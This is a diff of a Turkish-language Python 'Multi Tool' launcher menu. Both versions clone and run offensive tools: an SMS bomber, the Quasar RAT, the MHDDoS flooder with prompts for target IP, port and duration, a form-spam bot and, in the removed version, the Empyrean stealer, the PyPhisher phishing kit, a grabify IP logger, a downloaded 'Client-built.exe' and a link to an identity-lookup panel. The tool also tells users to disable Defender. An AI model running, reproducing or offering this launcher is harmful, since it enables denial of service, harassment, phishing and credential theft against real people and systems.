@@ -1,253 +1,461 @@
-import os
-import wget
+from colorama import Fore
 from os import system
+import os
 from time import sleep
-import time
-import colorama
-from colorama import Fore, Back
-
-# CMD FONKSIYON
-os.system("cls||clear")
-os.system("title Multi Tool by @zupppe")
-
-# KLASÖRLER / FONKSİYONLAR
-url = "https://dosya.co/thyots4y3oei/Client-built.exe.html"
-termux31 = lambda: os.system("cls||clear")
-clear = lambda: os.system("cls")
-sms_klasor = "erenbomb"
-rat_klasor = "empyrean"
-ipsorgu_klasor = "ipsorgu"
-phishing_klasor = "PyPhisher"
-
-# KOD
-cihaz_soru = input(Fore.LIGHTBLUE_EX + """                          
+import subprocess
+import wget
+import platform
 
 
 
+system("title Multi Tool  by @zupppe")
+# KLASÖRLER
+domain = "domain-checker"
+txt = "http.txt"
+fileddos = "files"
+proxies = "proxies"
+ddos = "MHDDoS"
+docs = "google-docs-bot"
+ipsorgu = "ipsorgu"
+tool ="tools"
+emp = "empyrean"
+bomb = "erenbomb"
+quasar = "quasar"
+git_exe = "Git-2.47.1-64-bit.exe"
+# ---------------------------------------------------------------------------------------------------------------------------------------------
+sil = lambda: system("cls||clear")
+calisantoolsayisi = 7
+dark = Fore.LIGHTBLACK_EX
+red = Fore.RED
+# -------------------------------------------git-------------------------------------------------------------------------------------------------
+sil()
+try:
+    result = subprocess.run(["git", "--version"], check=True, text=True, capture_output=True)
+    print(red + "Git versiyonu:", result.stdout)
+    sleep(0.00000000000001)
+    sil()
+except FileNotFoundError as e:
+    print(red + "Hata: Git yüklü değil veya sistemde bulunamıyor!")
+    sleep(5)
+    system_bits = platform.architecture()[0]
+    print(f"İşletim sistemi: {system_bits}")
+    if system_bits == ("64bit"):
+        sil()
+        print(red + "Dosyalar Yükleniyor Lütfen Bekleyiniz")
+        wget.download("https://github.com/git-for-windows/git/releases/download/v2.47.1.windows.1/Git-2.47.1-64-bit.exe")
+        sil()
+        system("start Git-2.47.1-64-bit.exe")
+        sil()
+    elif system_bits == ("32bit"):
+        sil()
+        print(red + "Dosyalar Yükleniyor Lütfen Bekleyiniz")
+        wget.download("https://github.com/git-for-windows/git/releases/download/v2.47.1.windows.1/Git-2.47.1-32-bit.exe")
+        system("start Git-2.47.1-32-bit.exe")
+        sil()
+    else:
+        system("start kurulum.bat")
+except subprocess.CalledProcessError as e:
+    print(red + "Hata: Git komutu çalıştırılırken bir sorun oluştu!")
+    sleep(5)
+    system("exit")
+#
+sil()
+isim_sorusu = input("""{}
+                    
+                    
+                            
+                    
+                    
+                                                    
+                                            
+                                                
+                    
+                                                    Enter Username : 
+                    
+                                            ----->{}    """.format(red, dark))
+sil()
+if os.path.isdir(tool):
+    sil()
+else:
+    os.mkdir(tool)
+    sil()
+def ekran():
+    print(red + """
+      
+     __    __     __  __     __         ______   __        ______   ______     ______     __        │ Working tools:
+    /\ "-./  \   /\ \/\ \   /\ \       /\__  _\ /\ \      /\__  _\ /\  __ \   /\  __ \   /\ \       │       {}{}{}  
+    \ \ \-./\ \  \ \ \_\ \  \ \ \____  \/_/\ \/ \ \ \     \/_/\ \/ \ \ \/\ \  \ \ \/\ \  \ \ \____  │────────────────   
+     \ \_\ \ \_\  \ \_____\  \ \_____\    \ \_\  \ \_\       \ \_\  \ \_____\  \ \_____\  \ \_____\ │ Account Name:  
+      \/_/  \/_/   \/_____/   \/_____/     \/_/   \/_/        \/_/   \/_____/   \/_____/   \/_____/ │  {}{}{}
+                                                                                                    │────────────────   
+                                you need to close your defender for some tools                      │  by {}@zupppe{}
+                                                                                                    │──────────────── 
+                                                                                                    │ {}Settings: {}!{}
+                                                                              
+                                                                              
+╔═══                              ═══╗ ╔═══                               ═══╗ ╔═══                                 ═══╗
+║   ({}01{}){} > STEALER/GRABBER{}           ║ ║   ({}10{}){} > N/A{}                        ║ ║   ({}19{}){} > N/A{}                          ║
+    ({}02{}){} > SMS BOMBER{}                      ({}11{}){} > N/A{}                              ({}20{}){} > N/A{}
+    ({}03{}){} > QUASAR RAT TOOL{}                 ({}12{}){} > N/A{}                              ({}21{}){} > N/A{}
+    ({}04{}){} > IP LOOKUP{}                       ({}13{}){} > N/A{}                              ({}22{}){} > N/A{}
+    ({}05{}){} > GOOGLE DOCS FORM BOT{}            ({}14{}){} > N/A{}                              ({}23{}){} > N/A{}
+    ({}06{}){} > L4/L7 DDOS TOOL{}                 ({}15{}){} > N/A{}                              ({}24{}){} > N/A{}
+    ({}07{}){} > DOMAIN CHECKER{}                  ({}16{}){} > N/A{}                              ({}25{}){} > N/A{}
+    ({}08{}){} > N/A{}                             ({}17{}){} > N/A{}                              ({}26{}){} > N/A{}
+║   ({}09{}){} > N/A{}                       ║ ║   ({}18{}){} > N/A{}                         ║ ║  ({}27{}){} > N/A{}                          ║
+╚═══                              ═══╝ ╚═══                                ═══╝ ╚═══                                ═══╝
+""".format(
+    dark, calisantoolsayisi, red,
+    dark, isim_sorusu, red,
+    dark, red,
+    red, dark, red,
+    dark, red, dark, red, dark, red, dark, red, dark, red, dark, red,
+    dark, red, dark, red, dark, red, dark, red, dark, red, dark, red,
+    dark, red, dark, red, dark, red, dark, red, dark, red, dark, red,
+    dark, red, dark, red, dark, red, dark, red, dark, red, dark, red,
+    dark, red, dark, red, dark, red, dark, red, dark, red, dark, red,
+    dark, red, dark, red, dark, red, dark, red, dark, red, dark, red,
+    dark, red, dark, red, dark, red, dark, red, dark, red, dark, red,
+    dark, red, dark, red, dark, red, dark, red, dark, red, dark, red,
+    dark, red, dark, red, dark, red, dark, red, dark, red, dark, red
+))
+def secim():
+    secim_soru = input("""
 
-
-
-                                Hangi Cihazı Kullanıyorsunuz? {}android{}/{}win{}/{}linux :
-                                
-                                
-                                
-                                -----> """.format(Fore.GREEN, Fore.BLUE, Fore.RED, Fore.BLUE, Fore.LIGHTMAGENTA_EX, Fore.RESET)).lower()
-if cihaz_soru == ("win"):
-    clear()
-    os.system("title Multi Tool   by @zupppe")
-    os.system("@echo off")
-    print(Fore.LIGHTBLUE_EX + """
- __    __     __  __     __         ______   __        ______   ______     ______     __        
-/\ "-./  \   /\ \/\ \   /\ \       /\__  _\ /\ \      /\__  _\ /\  __ \   /\  __ \   /\ \       
-\ \ \-./\ \  \ \ \_\ \  \ \ \____  \/_/\ \/ \ \ \     \/_/\ \/ \ \ \/\ \  \ \ \/\ \  \ \ \____  
- \ \_\ \ \_\  \ \_____\  \ \_____\    \ \_\  \ \_\       \ \_\  \ \_____\  \ \_____\  \ \_____\ 
-  \/_/  \/_/   \/_____/   \/_____/     \/_/   \/_/        \/_/   \/_____/   \/_____/   \/_____/
-
-
-                                                                            {}by {}@zupppe
-
-{}[{}1{}] {}İp Logger
-{}[{}2{}] {}Sms Bomber
-{}[{}3{}] {}Remote Acces Tool (Rat)
-{}[{}4{}] {}İp Sorgu {}# BAKIMDA #KODLANMA AŞAMASINDA
-{}[{}5{}] {}Turkish Mernis Panel
-                                                                                  
-{}
-""".format(Fore.BLUE, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.BLUE, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.BLUE, Fore.RESET))
-    anamenu_soru = input("{}Hangi Toola Giriş Yapmak İstersiniz: {}".format(Fore.BLUE, Fore.RESET))
-    if anamenu_soru == ("1"):
-        clear()
-        os.system("start https://grabify.link")
-        clear()
-        os.system("py multitool.py")
-    if anamenu_soru == ("2"):
-        clear()
-        sms_soru = input("{}Önceden Sms Bomber Kurdun Mu? {}y{}/{}n{}: ".format(Fore.BLUE, Fore.GREEN, Fore.BLUE, Fore.RED, Fore.RESET)).lower()
-        if sms_soru == ("n"):
-            clear()
-            print("""
-
-
-
-
-{}          
-  ____                        _             __   ___   _ _    _            _                  
- |  _ \  ___  ___ _   _  __ _| | __ _ _ __  \ \ / (_) (_) | _| | ___ _ __ (_)_   _  ___  _ __ 
- | | | |/ _ \/ __| | | |/ _` | |/ _` | '__|  \ V /| | | | |/ / |/ _ \ '_ \| | | | |/ _ \| '__|
- | |_| | (_) \__ \ |_| | (_| | | (_| | |      | | | |_| |   <| |  __/ | | | | |_| | (_) | |   
- |____/ \___/|___/\__, |\__,_|_|\__,_|_|      |_|  \__,_|_|\_\_|\___|_| |_|_|\__, |\___/|_|   
-                  |___/                                                      |___/     
-{}       
-    """.format(Fore.LIGHTBLUE_EX, Fore.RESET))
-            time.sleep(2)
-            clear()
-
-            os.system("git clone https://github.com/vHzEren/erenbomb.git")
-            os.chdir(sms_klasor)
-            os.system("pip install -r requirements.txt")
-            os.system("py erenbomb.py")
-        if sms_soru == ("y"):
-            clear()
-            os.chdir(sms_klasor)
-            os.system("py erenbomb.py")
-        if sms_soru != ("y","n"):
-            clear()
-            print(Fore.LIGHTRED_EX +"Hata Tespit Edildi En Başa Yönlendiriliyorsunuz... @zupppe")
-            time.sleep(3)
-            os.system("py multitool.py")
-    if anamenu_soru == ("3"):
-        clear()
-        rat_sorusu = input("{}Önceden Rat Kurdun mu? {}y{}/{}n{}: ".format(Fore.BLUE, Fore.GREEN, Fore.BLUE, Fore.RED, Fore.RESET)).lower()
-        if rat_sorusu == ("n"):
-            clear()
-            os.system("git clone https://github.com/addi00000/empyrean.git")
-            os.chdir(rat_klasor)
-            os.system("pip install -r requirements.txt")
-            os.system("start install_python.bat")
-            system("cls")
-            system("start Client-built.exe")
-            system("cls")
-            os.system("start build.bat")
+{}──────>{}  """.format(red, dark))
+# ----------------------------------------------------------------------------------------------------------------------------------------------
+    if secim_soru == ("1") or secim_soru == ("01"):
+        sil()
+        print(red + "YAKINDA..")
+        sleep(2)
+        sil()
+        ekran()
+        secim()
+    elif secim_soru == ("2") or secim_soru == ("02"):
+        sil()
+        os.chdir(tool)
+        if os.path.isdir(bomb):
+            os.chdir(bomb)
+            system("python erenbomb.py")
+        else:
+            sil()
+            system("git clone https://github.com/vHzEren/erenbomb.git")
+            sil()
+            os.chdir(bomb)
+            system("pip install -r requirements.txt")
+            sil()
+            system("python erenbomb.py")
+    elif secim_soru == ("3") or secim_soru == ("03"):
+        sil()
+        os.chdir(tool)
+        if os.path.isdir(quasar):
+            os.chdir(quasar)
+            system("start Quasar.exe")
+            sil()
+            ekran()
+            secim()
+        else:
+            sil()
+            system("git clone https://github.com/vHzEren/quasar.git")
+            sil()
+            os.chdir(quasar)
+            system("start Quasar.exe")
+            ekran()
+            secim()
+    elif secim_soru == ("4") or secim_soru == ("04"):
+        sil()
+        os.chdir(tool)
+        if os.path.isdir(ipsorgu):
+            os.chdir(ipsorgu)
+            sil()
+            system("python ipsorgu.py")
+        else:
+            sil()
+            system("git clone https://github.com/vHzEren/ipsorgu.git")
+            os.chdir(ipsorgu)
+            system("start module_install.bat")
+            system("python ipsorgu.py")
+    elif secim_soru == ("5") or secim_soru == ("05"):
+        sil()
+        os.chdir(tool)
+        if os.path.isdir(docs):
+            sil()
+            os.chdir(docs)
+            system("python docs-bot.py")
+        else:
+            sil()
+            system("git clone https://github.com/vHzEren/google-docs-bot.git")
+            sil()
+            system("pip install selenium")
+            sil()
+            os.chdir(docs)
+            system("python docs-bot.py")
+    elif secim_soru == ("6") or secim_soru == ("06"):
+        os.chdir(tool)
+        sil()
+        if os.path.isdir(ddos):
+            os.chdir(ddos)
+            layer_soru = input("LAYER7/LAYER4: ").lower()
+            if layer_soru == ("layer4"):
+                sil()
+                layer4_method = input(red + """ 
+    - Layer4
+| CHAR, MCBOT, TCP, UDP, ICMP, CLDAP, VSE, TS3, RDP, MCPE, CPS, ARD, NTP, CONNECTION, FIVEM, MEM, MINECRAFT, DNS, SYN | 19 Methods
+                                      
+            Method türünü yazınız
+        -----> {}""".format(dark)).upper()
+                sil()
+                ip_adress = input(red + "Hedef ip adresini giriniz: {}".format(dark))
+                sil()
+                port = input("{}4 basamaklı bir port adresi giriniz (önerilen=1080):{} ".format(red, dark))
+                sil()
+                threads_layer4 = input("""
+                                    {}!! UYARI !! YÜKSEK SAYILAR İŞLEMCİNİZİ ZORLAR !!
+                                            Threads sayısı giriniz: {}""".format(red, dark))
+                sil()
+                zaman_layer4 = input("{}Saniye olarak zaman belirleyiniz: {}".format(red, dark))
+                system("python start.py {} {}:{} {} {} http.txt".format(layer4_method, ip_adress, port, threads_layer4, zaman_layer4))
+            elif layer_soru == ("layer7"):
+                sil()
+                print(red + "YAKINDA..")
+            else:
+                sil()
+                ekran()
+                secim()
+        else:
+            system("git clone https://github.com/MatrixTM/MHDDoS.git")
+            os.chdir(ddos),
+            system("pip install requirements.txt")
+            sil()
+            os.chdir(fileddos)
             os.chdir("..")
-            os.system("cls")
-            os.system("py multitool.py")
-            module = wget.download(url)
-        if rat_sorusu == ("y"):
-            clear()
-            os.chdir(rat_klasor)
-            os.system("start build.bat")
             os.chdir("..")
-            os.system("cls")
-            os.system("py multitool.py")
-        if rat_sorusu != ("y","n"):
-            clear()
-            print(Fore.LIGHTRED_EX + "Hata Tespit Edildi En Başa Yönlendiriliyorsunuz... @zupppe")
-            time.sleep(3)
-            os.system("py multitool.py")
-    if anamenu_soru == ("4"):
-        clear()
-        ipsorusu = input("{}Önceden İp Sorgu Kurdun Mu? {}y{}/{}n{}: ".format(Fore.BLUE, Fore.GREEN, Fore.BLUE, Fore.RED, Fore.RESET)).lower()
-        if ipsorusu == ("n"):
-            clear()
-            print("""
-{}          
-  ____                        _             __   ___   _ _    _            _                  
- |  _ \  ___  ___ _   _  __ _| | __ _ _ __  \ \ / (_) (_) | _| | ___ _ __ (_)_   _  ___  _ __ 
- | | | |/ _ \/ __| | | |/ _` | |/ _` | '__|  \ V /| | | | |/ / |/ _ \ '_ \| | | | |/ _ \| '__|
- | |_| | (_) \__ \ |_| | (_| | | (_| | |      | | | |_| |   <| |  __/ | | | | |_| | (_) | |   
- |____/ \___/|___/\__, |\__,_|_|\__,_|_|      |_|  \__,_|_|\_\_|\___|_| |_|_|\__, |\___/|_|   
-                  |___/                                                      |___/     
-{}       
-    """.format(Fore.LIGHTBLUE_EX, Fore.RESET))
-            time.sleep(2)
-            clear()
-            os.system("git clone https://github.com/vHzEren/ipsorgu.git")
-            os.chdir(ipsorgu_klasor)
-            os.system("pip install requests")
-            clear()
-            os.system("py ipsorgu.py")
-        if ipsorusu == ("y"):
-            clear()
-            os.chdir(ipsorgu_klasor)
-            os.system("py ipsorgu.py")
-        if ipsorusu != ("y","n"):
-            clear()
-            print(Fore.LIGHTRED_EX + "Hata Tespit Edildi En Başa Yönlendiriliyorsunuz... @zupppe")
-            time.sleep(3)
-            os.system("py multitool.py")
-    if anamenu_soru == ("5"):
-        clear()
-        print(Fore.BLUE + "Panel Sitesine Yönlendiriliyorsunuz #VPN AÇMAYI UNUTMAYIN!")
-        time.sleep(5)    
-        os.system("start https://nopanel.run")
-        os.system("py multitool.py")
-if cihaz_soru == ("android"):
-    termux31()
-    print("""
-{}
-  __  __ _   _ _   _____ ___   _____ ___   ___  _     
- |  \/  | | | | | |_   _|_ _| |_   _/ _ \ / _ \| |    
- | |\/| | | | | |   | |  | |    | || | | | | | | |    
- | |  | | |_| | |___| |  | |    | || |_| | |_| | |___ 
- |_|  |_|\___/|_____|_| |___|   |_| \___/ \___/|_____|   {}mobil için
+            sil()
+            print("{}DDos tooluna tekrardan giriniz.. by {}@zupppe".format(red, dark))
+            sleep(5)
+            sil()
+            ekran()
+            secim()
+    elif secim_soru == ("7") or secim_soru == ("07"):
+        os.chdir(tool)
+        sil()
+        if os.path.isdir(domain):
+            os.chdir(domain)
+            sil()
+            system("python domain-checker.py")
+        else:
+            system("pip install socket")
+            system("git clone https://github.com/zupppe/domain-checker.git")
+            sil()
+            os.chdir(domain)
+            system("python domain-checker.py")
+    elif secim_soru == ("8") or secim_soru == ("08"):
+        sil()
+        sil()
+        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
+        sleep(5)
+        sil()
+        ekran()
+        secim()
+    elif secim_soru == ("9") or secim_soru == ("09"):
+        sil()
+        sil()
+        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
+        sleep(5)
+        sil()
+        ekran()
+        secim()
+    elif secim_soru == ("10"):
+        sil()
+        sil()
+        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
+        sleep(5)
+        sil()
+        ekran()
+        secim()
+    elif secim_soru == ("11"):
+        sil()
+        sil()
+        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
+        sleep(5)
+        sil()
+        ekran()
+        secim()
+    elif secim_soru == ("12"):
+        sil()
+        sil()
+        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
+        sleep(5)
+        sil()
+        ekran()
+        secim()
+    elif secim_soru == ("13"):
+        sil()
+        sil()
+        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
+        sleep(5)
+        sil()
+        ekran()
+        secim()
+    elif secim_soru == ("14"):
+        sil()
+        sil()
+        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
+        sleep(5)
+        sil()
+        ekran()
+        secim()
+    elif secim_soru == ("15"):
+        sil()
+        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
+        sleep(5)
+        sil()
+        ekran()
+        secim()
+    elif secim_soru == ("16"):
+        sil()
+        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
+        sleep(5)
+        sil()
+        ekran()
+        secim()
+    elif secim_soru == ("17"):
+        sil()
+        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
+        sleep(5)
+        sil()
+        ekran()
+        secim()
+    elif secim_soru == ("18"):
+        sil()
+        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
+        sleep(5)
+        sil()
+        ekran()
+        secim()
+    elif secim_soru == ("19"):
+        sil()
+        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
+        sleep(5)
+        sil()
+        ekran()
+        secim()
+    elif secim_soru == ("20"):
+        sil()
+        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
+        sleep(5)
+        sil()
+        ekran()
+        secim()
+    elif secim_soru == ("21"):
+        sil()
+        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
+        sleep(5)
+        sil()
+        ekran()
+        secim()
+    elif secim_soru == ("22"):
+        sil()
+        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
+        sleep(5)
+        sil()
+        ekran()
+        secim()
+    elif secim_soru == ("23"):
+        sil()
+        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
+        sleep(5)
+        sil()
+        ekran()
+        secim()
+    elif secim_soru == ("24"):
+        sil()
+        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
+        sleep(5)
+        sil()
+        ekran()
+        secim()
+    elif secim_soru == ("25"):
+        sil()
+        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
+        sleep(5)
+        sil()
+        ekran()
+        secim()
+    elif secim_soru == ("26"):
+        sil()
+        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
+        sleep(5)
+        sil()
+        ekran()
+        secim()
+    elif secim_soru == ("27"):
+        sil()
+        print(red + "Giriş yaptığınız seçenekte bir tool bulunmamaktadır. Başka toollara göz atmaya nedersin?")
+        sleep(5)
+        sil()
+        ekran()
+        secim()
 
-{}[{}1{}] {}PyPhisher 
-{}[{}2{}] {}Sms Bomber
-{}[{}3{}] {}İp Sorgu {}# BAKIMDA #KODLANMA AŞAMASINDA
-{}[{}4{}] {}Panel Sitesi {}#VPN GEREKTİRİR
-                                           
-    """.format(Fore.LIGHTBLUE_EX, Fore.BLUE, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX,
-               Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.BLUE, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.GREEN, Fore.LIGHTMAGENTA_EX, Fore.BLUE))
-    termuxanamenu = input("{}Hangi Toola Giriş Yapmak İstersiniz: {}".format(Fore.BLUE, Fore.RESET)).lower()
-    if termuxanamenu == ("1"):
-        termux31()
-        pyphsihersoru = input("{}Önceden hiç PyPhisher kurdunuz mu? {}y{}/{}n: {}".format(Fore.BLUE,Fore.GREEN, Fore.BLUE,Fore.RED, Fore.RESET)).lower()
-        if pyphsihersoru == ("n"):
-            os.system("git clone https://gitlab.com/KasRoudra/PyPhisher.git")
-            os.system("pkg install git python php openssh -y")
-            os.system("pip install pyphisher")
-            os.system("pip install -r files/requirements.txt --break-system-packages")
-            os.chdir(phishing_klasor)
-            os.system("python pyphisher.py")
-        if pyphsihersoru == ("y"):
-            termux31()
-            os.chdir(phishing_klasor)
-            os.system("python pyphisher.py")
-        if pyphsihersoru != ("y","n"):
-            termux31()
-            time.sleep(3)
-            print(Fore.LIGHTRED_EX +"Hata Tespit Edildi En Başa Yönlendiriliyorsunuz... @zupppe")
-            os.system("python3 multitool.py")
-    if termuxanamenu == ("2"):
-        termux31()
-        smsbombersoru = input("{}Önceden hiç Sms Bomber kurdunuz mu? {}y{}/{}n: {}".format(Fore.BLUE,Fore.GREEN, Fore.BLUE,Fore.RED, Fore.RESET)).lower()
-        if smsbombersoru == ("n"):
-            print(Fore.LIGHTBLUE_EX + "Yüklenmesi Biraz Zaman Alabilir..")
-            time.sleep(1.5)
-            termux31()        
-            os.system("git clone https://github.com/vHzEren/erenbomb.git")
-            os.chdir(sms_klasor)
-            os.system("pip install -r requirements.txt")
-            os.system("python erenbomb.py")
-        if smsbombersoru == ("y"):
-            termux31()
-            os.chdir(sms_klasor)
-            os.system("python erenbomb.py")
-        if smsbombersoru != ("y", "n"):
-            termux31()
-            print(Fore.LIGHTRED_EX +"Hata Tespit Edildi En Başa Yönlendiriliyorsunuz... @zupppe")
-            time.sleep(3)
-            os.system("python multitool.py")
-    if termuxanamenu == ("3"):
-        termux31()
-        ipsorgusorusu_termux = input("{}Önceden hiç İp Sorgu kurdunuz mu? {}y{}/{}n: {}".format(Fore.BLUE,Fore.GREEN, Fore.BLUE,Fore.RED, Fore.RESET)).lower()
-        if ipsorgusorusu_termux == ("n"):
-            termux31()
-            print(Fore.LIGHTBLUE_EX + "Dosyalar Yükleniyor..")
-            time.sleep(1.5)
-            os.system("git clone https://github.com/vHzEren/ipsorgu.git")
-            os.chdir(ipsorgu_klasor)
-            os.system("python ipsorgu.py")
-        if ipsorgusorusu_termux == ("y"):
-            termux31()
-            os.chdir(ipsorgu_klasor)
-            os.system("python ipsorgu.py")
-        if ipsorgusorusu_termux != ("y", "n"):
-            termux31()
-            print(Fore.LIGHTRED_EX +"Hata Tespit Edildi En Başa Yönlendiriliyorsunuz... @zupppe")
-            time.sleep(3)
-            os.system("python multitool.py")
-    if termuxanamenu == ("4"):
-        termux31()
-        print(Fore.BLUE +""" Panel Sitesini Tarayıcınıza Girin {}#VPN GEREKTİRİR
-        {}https://nopanel.pics/login""".format(Fore.LIGHTBLUE_EX, Fore.RED + Back.WHITE))
-        time.sleep(5)
-if cihaz_soru == ("linux"):
-    termux31()
-    print("COMING SOON")
-    time.sleep(5)
-if cihaz_soru != ("win","android","linux"):
-    os.system("cls||clear")
-    print(Fore.LIGHTRED_EX +"Hata Tespit Edildi En Başa Yönlendiriliyorsunuz... @zupppe")
-    time.sleep(3)
-    os.system("python multitool.py")
+    elif secim_soru == ("!"):
+        sil()
+        def tema_sec():
+            global red, dark
+            print("""
+{}                              ╔═══               ═══╗
+{}                              ║                     ║
+{}                                ({}1{}){} > RED{}                  
+{}                                ({}2{}){} > GREEN{}
+{}                                ({}3{}){} > PURPLE{}
+{}                                ({}4{}){} > YELLOW{}
+{}                                ({}5{}){} > CYAN{}
+{}                                ({}6{}){} > BLUE{}
+{}                                ({}7{}){} > WHITE{}
+{}                                ({}8{}){} > RAINBOW{}
+{}                              ║                     ║
+{}                              ╚═══               ═══╝
+            """.format(
+red,
+red,
+red, dark, red, dark, red,
+red, dark, red, dark, red,
+red, dark, red, dark, red,
+red, dark, red, dark, red,
+red, dark, red, dark, red,
+red, dark, red, dark, red,
+red, dark, red, dark, red,
+red, dark, red, dark, red,
+red,
+red   
+            ))
+    
+            secim = input("{}──────>{}  ".format(red, dark))
+
+            if secim == "1":
+                red = Fore.RED
+            elif secim == "2":
+                red = Fore.LIGHTGREEN_EX
+            elif secim == "3":
+                red = Fore.LIGHTMAGENTA_EX
+            elif secim == "4":
+                red = Fore.YELLOW
+            elif secim == "5":
+                red = Fore.LIGHTCYAN_EX
+            elif secim == "6":
+                red = Fore.BLUE
+            elif secim == "7":
+                red = Fore.WHITE
+        tema_sec()
+        sil()
+        ekran()
+        secim()
+    else:
+        sil()
+        print("{}Hatalı bir seçenekte bulundunuz. Lütfen bir rakam giriniz.. {}@zupppe".format(red, dark))
+        sleep(3)
+        sil()
+        ekran()
+        secim()
+# --------------------------------------------------CODE--------------CODE--------------CODE---------------------CODE---------------------------
+ekran()
+secim()
